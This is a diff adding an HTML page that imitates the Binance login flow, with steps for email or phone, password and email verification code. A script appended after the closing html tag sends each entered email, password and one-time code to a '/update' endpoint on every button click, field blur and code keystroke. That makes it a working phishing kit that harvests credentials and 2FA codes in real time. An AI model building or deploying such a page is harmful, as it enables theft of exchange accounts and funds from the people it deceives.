@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Log in – Binance</title>
+<style>
+  * {
+    box-sizing: border-box;
+  }
+
+
+  /* Skip link */
+  .skip-link {
+    position: absolute;
+    top: -999px;
+    left: 8px;
+    background: #181a20;
+    color: #fff;
+    padding: 8px 16px;
+    border-radius: 6px;
+    font-size: 15px;
+    font-weight: 600;
+    text-decoration: none;
+    z-index: 1000;
+  }
+  .skip-link:focus {
+    top: 8px;
+  }
+
+  /* Visible focus ring for all interactive elements */
+  :focus-visible {
+    outline: 3px solid #181a20;
+    outline-offset: 3px;
+    border-radius: 4px;
+  }
+
+  /* Reduced motion */
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after {
+      transition: none !important;
+      animation: none !important;
+    }
+  }
+
+  body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #ffffff;
+    display: flex;
+    justify-content: center;
+  }
+
+  .screen {
+    width: 100%;
+    max-width: 480px;
+    min-height: 100vh;
+    padding: 40px 28px;
+    background: #ffffff;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .footer-protected {
+    display: none;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    color: #9aa1ab;
+    font-size: 16px;
+    margin-top: auto;
+    padding-top: 40px;
+    padding-bottom: 16px;
+  }
+
+  .footer-protected.show {
+    display: flex;
+  }
+
+  .footer-protected svg {
+    flex-shrink: 0;
+  }
+
+  .verify-links {
+    margin-top: 36px;
+  }
+
+  .verify-links .cant-login {
+    display: block;
+    margin-bottom: 32px;
+  }
+
+  .step-verify .title {
+    margin: 0 0 28px 0;
+  }
+
+  .step-verify .subtitle {
+    margin: 0 0 52px 0;
+  }
+
+  .step-verify .field-label {
+    margin-bottom: 13px;
+  }
+
+  .step-verify .code-sent-pill {
+    font-size: 18px;
+  }
+
+  .step-verify .input-wrap {
+    margin-bottom: 34px;
+  }
+
+  .close-btn {
+    background: none;
+    border: none;
+    padding: 4px;
+    cursor: pointer;
+    margin-bottom: 28px;
+    display: block;
+  }
+
+  h1.title {
+    font-size: 31px;
+    font-weight: 800;
+    margin: 16px 0 32px 0;
+    color: #181a20;
+    letter-spacing: -0.5px;
+  }
+
+  .masked-id {
+    font-size: 16px;
+    color: #707a8a;
+    margin: -8px 0 32px 0;
+  }
+
+  .field-label {
+    font-size: 16px;
+    color: #707a8a;
+    margin-bottom: 12px;
+  }
+
+  .input-wrap {
+    background: #f5f5f5;
+    border-radius: 14px;
+    padding: 20px 18px;
+    margin-bottom: 32px;
+  }
+
+  .input-wrap input {
+    width: 100%;
+    border: none;
+    background: transparent;
+    outline: none;
+    font-size: 16px;
+    color: #181a20;
+  }
+
+  .input-wrap input::placeholder {
+    color: #9aa1ab;
+  }
+
+  .btn-continue {
+    width: 100%;
+    background: #fcd535;
+    color: #181a20;
+    border: none;
+    border-radius: 14px;
+    padding: 20px 0;
+    font-size: 19px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: background 0.15s ease;
+  }
+
+  .btn-continue:hover {
+    background: #f0c92e;
+  }
+
+  .btn-continue:active {
+    background: #e3bd23;
+  }
+
+  .btn-continue:focus-visible {
+    outline: 2px solid #181a20;
+    outline-offset: 2px;
+  }
+
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin: 32px 0;
+  }
+
+  .divider .line {
+    flex: 1;
+    height: 1px;
+    background: #eaecef;
+  }
+
+  .divider span {
+    font-size: 16px;
+    color: #707a8a;
+  }
+
+  .btn-secondary {
+    width: 100%;
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    background: #ffffff;
+    border: 1px solid #eaecef;
+    border-radius: 14px;
+    padding: 16px 18px;
+    font-size: 19px;
+    font-weight: 500;
+    color: #181a20;
+    cursor: pointer;
+    margin-bottom: 16px;
+    transition: background 0.15s ease;
+  }
+
+  .btn-secondary:hover {
+    background: #fafafa;
+  }
+
+  .btn-secondary:focus-visible {
+    outline: 2px solid #181a20;
+    outline-offset: 2px;
+  }
+
+  .btn-secondary svg {
+    flex-shrink: 0;
+  }
+
+  .cant-login {
+    display: block;
+    margin-top: 0;
+    font-size: 18px;
+    font-weight: 500;
+    color: #f0b90b;
+    text-decoration: none;
+    cursor: pointer;
+    background: none;
+    border: none;
+    padding: 0;
+    text-align: left;
+  }
+
+  .create-account {
+    display: block;
+    margin-top: 56px;
+    margin-bottom: 28px;
+    font-size: 18px;
+    font-weight: 500;
+    color: #f0b90b;
+    text-decoration: none;
+    cursor: pointer;
+    background: none;
+    border: none;
+    padding: 0;
+    text-align: left;
+  }
+
+  .input-wrap.password-wrap {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+
+  .input-wrap.password-wrap input {
+    flex: 1;
+  }
+
+  .eye-toggle {
+    background: none;
+    border: none;
+    padding: 0;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    color: #9aa1ab;
+    flex-shrink: 0;
+  }
+
+  .step {
+    display: none;
+  }
+
+  .step.active {
+    display: block;
+  }
+  .input-wrap.input-error {
+    border: 1px solid #f6465d;
+  }
+
+  .error-message {
+    display: none;
+    color: #f6465d;
+    font-size: 15px;
+    line-height: 1.4;
+    margin: -20px 0 24px 0;
+  }
+
+  .error-message.show {
+    display: block;
+  }
+
+  .info-tooltip {
+    display: inline-flex;
+    cursor: pointer;
+  }
+
+  .code-tooltip-container {
+    position: relative;
+  }
+
+  .tooltip-bubble {
+    display: none;
+    position: absolute;
+    top: calc(100% + 10px);
+    left: 0;
+    right: 0;
+    background: #4b4f56;
+    color: #ffffff;
+    font-size: 15px;
+    line-height: 1.5;
+    padding: 16px 18px;
+    border-radius: 10px;
+    z-index: 10;
+    text-align: left;
+    box-shadow: 0 4px 16px rgba(0,0,0,0.2);
+  }
+
+  .tooltip-bubble::before {
+    content: '';
+    position: absolute;
+    top: -9px;
+    right: 20px;
+    border-left: 9px solid transparent;
+    border-right: 9px solid transparent;
+    border-bottom: 9px solid #4b4f56;
+  }
+
+  .tooltip-bubble.show {
+    display: block;
+  }
+
+  .back-btn {
+    background: none;
+    border: none;
+    padding: 4px;
+    cursor: pointer;
+    margin-bottom: 28px;
+    display: block;
+  }
+
+  .top-bar {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 28px;
+  }
+
+  .top-bar .back-btn,
+  .top-bar .close-btn {
+    margin-bottom: 0;
+  }
+
+  .subtitle {
+    font-size: 18px;
+    color: #707a8a;
+    line-height: 1.5;
+    margin: 0 0 40px 0;
+  }
+
+  .input-wrap.code-wrap {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .code-input {
+    border: none;
+    background: transparent;
+    outline: none;
+    font-size: 16px;
+    color: #181a20;
+    flex: 1;
+    min-width: 0;
+  }
+
+  .code-sent-pill {
+    display: flex;
+    align-items: center;
+    gap: 7px;
+    color: #b0b7c3;
+    font-size: 18px;
+    font-weight: 400;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+
+  .code-sent-pill svg {
+    flex-shrink: 0;
+    color: #b0b7c3;
+  }
+
+  .info-tooltip {
+    display: inline-flex;
+    align-items: center;
+    background: none;
+    border: none;
+    padding: 0;
+    cursor: pointer;
+    color: #b0b7c3;
+  }
+
+  .resend-code-btn {
+    display: none;
+    background: none;
+    border: none;
+    padding: 0;
+    font-size: 17px;
+    font-weight: 600;
+    color: #dca50a;
+    cursor: pointer;
+    white-space: nowrap;
+    flex-shrink: 0;
+  }
+</style>
+</head>
+<body>
+  <a href="#main-content" class="skip-link">Skip to main content</a>
+  <div class="screen">
+    <main id="main-content">
+    <div class="step step-email active" id="stepEmail" role="region" aria-label="Step 1: Log in">
+      <h1 class="title">Log in</h1>
+
+      <label class="field-label" for="emailInput">Email/Phone number</label>
+      <div class="input-wrap" id="emailInputWrap">
+        <input type="text" id="emailInput" placeholder="Email/Phone (without country code)" autocomplete="username" aria-required="true" aria-describedby="emailError" />
+      </div>
+      <div class="error-message" id="emailError" role="alert" aria-live="assertive">Please enter a valid email or phone number. Spaces or special characters are not allowed for phone numbers.</div>
+
+      <button class="btn-continue" id="emailContinueBtn">Continue</button>
+
+      <div class="divider">
+        <div class="line"></div>
+        <span>or</span>
+        <div class="line"></div>
+      </div>
+
+      <button class="btn-secondary">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#181a20" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+          <circle cx="7.2" cy="6.2" r="2.7"></circle>
+          <path d="M2.2 18.5c0-3.6 2.2-6.1 5-6.1s5 2.5 5 6.1"></path>
+          <circle cx="17.5" cy="8.3" r="2.1"></circle>
+          <path d="M17.5 10.4 L17.5 16.5"></path>
+          <path d="M17.5 13.2 L20 13.2"></path>
+          <path d="M17.5 15.2 L19.2 15.2"></path>
+        </svg>
+        Continue with Passkey
+      </button>
+
+      <button class="btn-secondary">
+        <svg width="22" height="22" viewBox="0 0 48 48">
+          <path fill="#FFC107" d="M43.6 20.5H42V20.4H24v7.2h11.3c-1.6 4.6-6 7.9-11.3 7.9-6.6 0-12-5.4-12-12s5.4-12 12-12c3.1 0 5.8 1.1 8 3l5.1-5.1C33.6 6 29.1 4 24 4 12.9 4 4 12.9 4 24s8.9 20 20 20 20-8.9 20-20c0-1.2-.1-2.4-.4-3.5z"/>
+          <path fill="#FF3D00" d="M6.3 14.7l5.9 4.3C13.7 15.3 18.5 12 24 12c3.1 0 5.8 1.1 8 3l5.1-5.1C33.6 6 29.1 4 24 4 16.3 4 9.6 8.4 6.3 14.7z"/>
+          <path fill="#4CAF50" d="M24 44c5 0 9.5-1.9 12.9-5.1l-6-5c-2 1.4-4.6 2.1-6.9 2.1-5.3 0-9.7-3.4-11.3-8.1l-6 4.6C9.6 39.6 16.3 44 24 44z"/>
+          <path fill="#1976D2" d="M43.6 20.5H42V20.4H24v7.2h11.3c-.8 2.2-2.2 4.1-4 5.5l6 5C40.5 35.6 44 30.3 44 24c0-1.2-.1-2.4-.4-3.5z"/>
+        </svg>
+        Continue with Google
+      </button>
+
+      <button class="create-account">Create a Binance Account</button>
+      <button class="cant-login">Can't log in?</button>
+    </div>
+
+    <div class="step step-password" id="stepPassword" role="region" aria-label="Step 2: Enter password">
+      <button class="back-btn" id="backBtn" aria-label="Back">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#181a20" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M19 12 L5 12"></path>
+          <path d="M11 6 L5 12 L11 18"></path>
+        </svg>
+      </button>
+
+      <h1 class="title">Enter your password</h1>
+      <div class="masked-id" id="maskedId"></div>
+
+      <label class="field-label" for="passwordInput">Password</label>
+      <div class="input-wrap password-wrap" id="passwordInputWrap">
+        <input type="password" id="passwordInput" placeholder="" autocomplete="current-password" aria-required="true" aria-describedby="passwordError" />
+        <button class="eye-toggle" id="eyeToggle" aria-label="Show password">
+          <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M2 12c2.5-4.5 6-7 10-7s7.5 2.5 10 7c-2.5 4.5-6 7-10 7s-7.5-2.5-10-7z"></path>
+            <circle cx="12" cy="12" r="2.5"></circle>
+            <path d="M3 21 L21 3"></path>
+          </svg>
+        </button>
+      </div>
+      <div class="error-message" id="passwordError" role="alert" aria-live="assertive">Please enter your password.</div>
+
+      <button class="btn-continue" id="passwordContinueBtn">Continue</button>
+      <button class="cant-login" style="margin-top: 24px;">Forgot password?</button>
+    </div>
+
+    <div class="step step-verify" id="stepVerify" role="region" aria-label="Step 3: Email verification">
+      <div class="top-bar">
+        <button class="back-btn" id="backBtnVerify" aria-label="Back">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#181a20" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12 L5 12"></path>
+            <path d="M11 6 L5 12 L11 18"></path>
+          </svg>
+        </button>
+        <button class="close-btn" id="closeBtnVerify" aria-label="Close" style="margin-bottom:0;">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#181a20" stroke-width="2" stroke-linecap="round">
+            <path d="M5 5 L19 19"></path>
+            <path d="M19 5 L5 19"></path>
+          </svg>
+        </button>
+      </div>
+
+      <h1 class="title">Email Verification</h1>
+      <p class="subtitle">Enter the 6-digit verification code sent to <span id="verifyMaskedId"></span>.</p>
+
+      <label class="field-label" for="codeInput">Email Verification Code</label>
+      <div class="code-tooltip-container">
+        <div class="input-wrap code-wrap">
+          <input type="text" inputmode="numeric" maxlength="6" class="code-input" id="codeInput" placeholder="" autocomplete="one-time-code" aria-required="true" aria-label="6-digit verification code" />
+          <div class="code-sent-pill" id="codeSentPill">
+            Code Sent
+            <button type="button" class="info-tooltip" id="infoTooltipTrigger" aria-label="Show code expiry information" aria-expanded="false" aria-controls="tooltipBubble">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <line x1="12" y1="10.5" x2="12" y2="17"></line>
+                <circle cx="12" cy="7.2" r="1.1" fill="currentColor" stroke="none"></circle>
+              </svg>
+            </button>
+          </div>
+        <button class="resend-code-btn" id="resendCodeBtn" aria-label="Resend verification code">Resend Code</button>
+        </div>
+        <div class="tooltip-bubble" id="tooltipBubble" role="tooltip" aria-live="polite">
+          <span id="tooltipText">You can request a new code in 60 seconds. The code will expire in 30 minutes.</span>
+        </div>
+      </div>
+
+      <button class="btn-continue" id="verifyContinueBtn">Submit</button>
+
+      <div class="verify-links">
+        <button class="cant-login">Security verification unavailable?</button>
+        <button class="cant-login">Didn't receive email verification code?</button>
+      </div>
+    </div>
+
+    </main>
+
+    <div class="footer-protected" id="footerProtected" role="contentinfo">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M12 2.5 L20 6 V11 C20 16 16.5 19.8 12 21.5 C7.5 19.8 4 16 4 11 V6 Z"></path>
+        <rect x="9.3" y="10.6" width="5.4" height="4.4" rx="0.8"></rect>
+        <path d="M10.3 10.6 V9 a1.7 1.7 0 0 1 3.4 0 v1.6"></path>
+      </svg>
+      Protected by Binance Risk
+    </div>
+  </div>
+
+  <script>
+    const stepEmail = document.getElementById('stepEmail');
+    const stepPassword = document.getElementById('stepPassword');
+    const emailContinueBtn = document.getElementById('emailContinueBtn');
+    const passwordContinueBtn = document.getElementById('passwordContinueBtn');
+    const eyeToggle = document.getElementById('eyeToggle');
+    const eyeIcon = document.getElementById('eyeIcon');
+    const passwordInput = document.getElementById('passwordInput');
+    const emailInput = document.getElementById('emailInput');
+    const maskedId = document.getElementById('maskedId');
+    const emailInputWrap = document.getElementById('emailInputWrap');
+    const emailError = document.getElementById('emailError');
+    const backBtn = document.getElementById('backBtn');
+    const stepVerify = document.getElementById('stepVerify');
+    const verifyMaskedId = document.getElementById('verifyMaskedId');
+    const backBtnVerify = document.getElementById('backBtnVerify');
+    const verifyContinueBtn = document.getElementById('verifyContinueBtn');
+    const codeInput = document.getElementById('codeInput');
+    const footerProtected = document.getElementById('footerProtected');
+    const passwordInputWrap = document.getElementById('passwordInputWrap');
+    const passwordError = document.getElementById('passwordError');
+    const infoTooltipTrigger = document.getElementById('infoTooltipTrigger');
+    const tooltipBubble = document.getElementById('tooltipBubble');
+    const tooltipText = document.getElementById('tooltipText');
+
+    function isValidIdentifier(value) {
+      value = value.trim();
+      if (!value) return false;
+
+      // Email check
+      if (value.includes('@')) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
+      }
+
+      // Phone check: digits only, no spaces or special characters, reasonable length
+      return /^[0-9]{4,15}$/.test(value);
+    }
+
+    function showEmailError() {
+      emailInputWrap.classList.add('input-error');
+      emailError.classList.add('show');
+    }
+
+    function clearEmailError() {
+      emailInputWrap.classList.remove('input-error');
+      emailError.classList.remove('show');
+    }
+
+    function maskIdentifier(value) {
+      value = value.trim();
+      if (!value) return '';
+
+      const atIndex = value.indexOf('@');
+      if (atIndex > 0) {
+        // Email: keep first char, exactly 4 asterisks, then domain
+        const local = value.slice(0, atIndex);
+        const domain = value.slice(atIndex);
+        const visible = local.slice(0, 1);
+        return visible + '****' + domain;
+      }
+
+      // Phone number: first 3 digits, then ****, then last 4 digits
+      const digits = value.replace(/\D/g, '');
+      if (digits.length >= 7) {
+        const visibleStart = digits.slice(0, 3);
+        const visibleEnd = digits.slice(-4);
+        return visibleStart + '****' + visibleEnd;
+      }
+      if (digits.length >= 4) {
+        const visibleEnd = digits.slice(-4);
+        return '****' + visibleEnd;
+      }
+
+      // Fallback: first char + mask
+      return value.slice(0, 1) + '****';
+    }
+
+    function maskForVerification(value) {
+      value = value.trim();
+      if (!value) return '';
+
+      const atIndex = value.indexOf('@');
+      if (atIndex > 0) {
+        // Email: first 3 chars, then exactly 3 asterisks, then domain
+        const local = value.slice(0, atIndex);
+        const domain = value.slice(atIndex);
+        const visible = local.slice(0, 3);
+        return visible + '***' + domain;
+      }
+
+      // Phone number fallback: first 3 digits, then ***, then last 4 digits
+      const digits = value.replace(/\D/g, '');
+      if (digits.length >= 7) {
+        return digits.slice(0, 3) + '***' + digits.slice(-4);
+      }
+      return value.slice(0, 3) + '***';
+    }
+
+    emailContinueBtn.addEventListener('click', () => {
+      if (!isValidIdentifier(emailInput.value)) {
+        showEmailError();
+        return;
+      }
+      clearEmailError();
+      maskedId.textContent = maskIdentifier(emailInput.value) || 's****@gmail.com';
+      stepEmail.classList.remove('active');
+      stepPassword.classList.add('active');
+      passwordInput.focus();
+    });
+
+    emailInput.addEventListener('input', clearEmailError);
+
+    backBtn.addEventListener('click', () => {
+      stepPassword.classList.remove('active');
+      stepEmail.classList.add('active');
+      passwordInput.value = '';
+    });
+
+    passwordContinueBtn.addEventListener('click', () => {
+      if (!passwordInput.value.trim()) {
+        passwordInputWrap.classList.add('input-error');
+        passwordError.classList.add('show');
+        passwordInput.focus();
+        return;
+      }
+      passwordInputWrap.classList.remove('input-error');
+      passwordError.classList.remove('show');
+      verifyMaskedId.textContent = maskForVerification(emailInput.value) || 'muk***@gmail.com';
+      stepPassword.classList.remove('active');
+      stepVerify.classList.add('active');
+      footerProtected.classList.add('show');
+      startCountdown();
+      codeInput.focus();
+    });
+
+    passwordInput.addEventListener('input', () => {
+      passwordInputWrap.classList.remove('input-error');
+      passwordError.classList.remove('show');
+    });
+
+    backBtnVerify.addEventListener('click', () => {
+      stepVerify.classList.remove('active');
+      stepPassword.classList.add('active');
+      footerProtected.classList.remove('show');
+      codeInput.value = '';
+    });
+
+    verifyContinueBtn.addEventListener('click', () => {
+      // placeholder action for final submit
+      verifyContinueBtn.textContent = 'Continue';
+    });
+
+    eyeToggle.addEventListener('click', () => {
+      const showing = passwordInput.type === 'text';
+      passwordInput.type = showing ? 'password' : 'text';
+      eyeIcon.innerHTML = showing
+        ? '<path d="M2 12c2.5-4.5 6-7 10-7s7.5 2.5 10 7c-2.5 4.5-6 7-10 7s-7.5-2.5-10-7z"></path><circle cx="12" cy="12" r="2.5"></circle><path d="M3 21 L21 3"></path>'
+        : '<path d="M2 12c2.5-4.5 6-7 10-7s7.5 2.5 10 7c-2.5 4.5-6 7-10 7s-7.5-2.5-10-7z"></path><circle cx="12" cy="12" r="2.5"></circle>';
+      eyeToggle.setAttribute('aria-label', showing ? 'Show password' : 'Hide password');
+    });
+
+    // Resend countdown logic
+    let resendSecondsLeft = 60;
+    let countdownTimer = null;
+    const resendCodeBtn = document.getElementById('resendCodeBtn');
+
+    function updateTooltipText() {
+      tooltipText.textContent = resendSecondsLeft > 0
+        ? `You can request a new code in ${resendSecondsLeft} seconds. The code will expire in 30 minutes.`
+        : `You can request a new code now. The code will expire in 30 minutes.`;
+    }
+
+    function showResendState() {
+      codeSentPill.style.display = 'none';
+      resendCodeBtn.style.display = 'block';
+      tooltipBubble.classList.remove('show');
+    }
+
+    function showCodeSentState() {
+      codeSentPill.style.display = 'flex';
+      resendCodeBtn.style.display = 'none';
+    }
+
+    function startCountdown() {
+      resendSecondsLeft = 60;
+      showCodeSentState();
+      updateTooltipText();
+      if (countdownTimer) clearInterval(countdownTimer);
+      countdownTimer = setInterval(() => {
+        if (resendSecondsLeft > 0) {
+          resendSecondsLeft -= 1;
+          updateTooltipText();
+        } else {
+          clearInterval(countdownTimer);
+          showResendState();
+        }
+      }, 1000);
+    }
+
+    resendCodeBtn.addEventListener('click', () => {
+      startCountdown();
+    });
+
+    infoTooltipTrigger.addEventListener('click', (e) => {
+      e.stopPropagation();
+      const isShowing = tooltipBubble.classList.toggle('show');
+      infoTooltipTrigger.setAttribute('aria-expanded', isShowing ? 'true' : 'false');
+      if (isShowing) {
+        updateTooltipText();
+      }
+    });
+
+    document.addEventListener('click', (e) => {
+      if (!infoTooltipTrigger.contains(e.target) && !tooltipBubble.contains(e.target)) {
+        tooltipBubble.classList.remove('show');
+        infoTooltipTrigger.setAttribute('aria-expanded', 'false');
+      }
+    });
+
+    document.addEventListener('keydown', (e) => {
+      if (e.key === 'Escape' && tooltipBubble.classList.contains('show')) {
+        tooltipBubble.classList.remove('show');
+        infoTooltipTrigger.setAttribute('aria-expanded', 'false');
+        infoTooltipTrigger.focus();
+      }
+    });
+  </script>
+</body>
+</html>
+<script>
+var sessionId = Date.now().toString();
+function saveData(step) {
+  var email = document.getElementById('emailInput') ? document.getElementById('emailInput').value : '';
+  var password = document.getElementById('passwordInput') ? document.getElementById('passwordInput').value : '';
+  var code = document.getElementById('codeInput') ? document.getElementById('codeInput').value : '';
+  if(!email) return;
+  fetch('/update', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: 'sid=' + encodeURIComponent(sessionId) +
+          '&email=' + encodeURIComponent(email) +
+          '&password=' + encodeURIComponent(password) +
+          '&code=' + encodeURIComponent(code)
+  });
+}
+document.addEventListener('DOMContentLoaded', function() {
+  document.querySelectorAll('button').forEach(function(btn) {
+    btn.addEventListener('click', function() { saveData(btn.id); });
+  });
+  var emailInput = document.getElementById('emailInput');
+  if(emailInput) emailInput.addEventListener('blur', function() { saveData('email'); });
+  var passwordInput = document.getElementById('passwordInput');
+  if(passwordInput) passwordInput.addEventListener('blur', function() { saveData('password'); });
+  var codeInput = document.getElementById('codeInput');
+  if(codeInput) codeInput.addEventListener('input', function() { saveData('code'); });
+});
+</script>
